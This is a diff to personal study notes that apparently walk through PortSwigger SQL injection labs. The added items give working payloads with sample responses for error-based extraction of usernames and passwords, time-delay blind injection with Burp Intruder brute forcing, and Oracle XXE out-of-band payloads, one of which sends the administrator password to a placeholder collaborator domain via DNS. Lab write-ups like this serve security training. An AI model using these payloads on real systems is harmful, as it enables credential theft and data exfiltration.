@@ -139,13 +139,53 @@
     - enumerate password (Burp intruder: cluster bomb)  
       TrackingId=ZZZ`'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
       **Position**:§1§,§a§; **Paylaods**: payload 1: numbers; payload 2: brute forcer a-z,0-9-->Start Attack-->Find 500 response code
-25. Item 13
-26. Item 14
-27. Item 15
-28. Item 16
-29. Item 17
-30. Item 18
-31. 
+25. Visible **error-based** SQL injection
+    - Single quote to output verbose error message  
+      Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'vwGUdLnAnuxjsJBf''. Expected  char
+    - `' AND CAST((SELECT 1) AS int)--`  
+      ERROR: argument of AND must be type boolean, not type integer Position: 63
+    - `' AND 1=CAST((SELECT 1) AS int)--`  
+      No error  
+    - `' AND 1=CAST((SELECT username FROM users) AS int)--`  
+      Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'vwGUdLnAnuxjsJBf' AND 1=CAST((SELECT username FROM users) AS'. **Expected  char**
+    - Delete cookie value to free up some additional characters. Resend the request  
+      ERROR: **more than one row** returned by a subquery used as an expression  
+    - `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`  
+      ERROR: invalid input syntax for type integer: "**administrator**"  (leaks the first username)
+    - `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`  
+      ERROR: invalid input syntax for type integer: "**41nsvq98jt6vtegvlafu**"
+27. Blind SQL injection with **time delays**
+    - `'||pg_sleep(10)--`
+29. Blind SQL injection with **time delays** and **information retrieval**
+    - Note: URL encode key character ';' = '%3B'
+    - Test true condition time delay  
+      `'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(3) END--`
+    - Test false condition and no time delay  
+      `%3BSELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(3) END--`
+    - Verify username is 'administrator'. Condition is true, time delay  
+      `'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--`
+    - Retrieve password length (Burp Intruder: Sniper)-->**Click columns-->Response Received**-->To monitor time response  
+      `'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)=§1§) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--`
+    - Extract a single character from the password (Burp Intruder:Cluster Bomb)-->Resource Pool-->Max 1 concurrent request
+      `'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users--`
+31. Blind SQL injection with **out-of-band** interaction
+    - Perform a DNS lookup to an external domain. Use Burp Collaborator client to generate a unique Burp Collaborator subdomain, and then poll the collaborator server to confirm that a [DNS lookup](https://portswigger.net/web-security/sql-injection/cheat-sheet#DNS%20lookup) occurred.
+    - Click Burp Menu-->**Burp Collaborator Client**-->Button 'Copy to clipboard'
+    - `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
+    - Convert payload to URL encode format then send request
+    - Click Button '**Poll now**'  
+33. Blind SQL injection with **out-of-band data exfiltration**
+    - `EXTRACTVALUE` is an Oracle SQL function that retrieves the value of a specified XML element.
+    - `xmltype(...)` creates an XMLType from the given string.
+    - `<?xml version="1.0" encoding="UTF-8"?>` is XML declaration.
+    - `<!DOCTYPE root [ ... ]>` defines a Document Type Definition (DTD) for the XML.
+    - `<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">` defines an external entity %remote that fetches content from a remote URL. The URL is dynamically constructed by concatenating a static string ("http://) with the result of a subquery (SELECT password FROM users WHERE username='administrator') and a static string ('.BURP-COLLABORATOR-SUBDOMAIN/").
+    - `%remote;` This entity reference is used to include the content fetched from the remote URL into the XML document.
+    - `FROM dual` is a dummy table used in Oracle databases when a table reference is required but no actual table is necessary.
+    - `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
+    - In burp colloborator, click button 'Poll now'. Read the description: The Collaborator server received a DNS lookup of type AAAA for the domain name **7rma86kuw6xbyvgxltiy**.7169ftyykb10b1kwbjhbipnfz65wtl.oastify.com  
+35. Item 18
+36. 
 
 
 
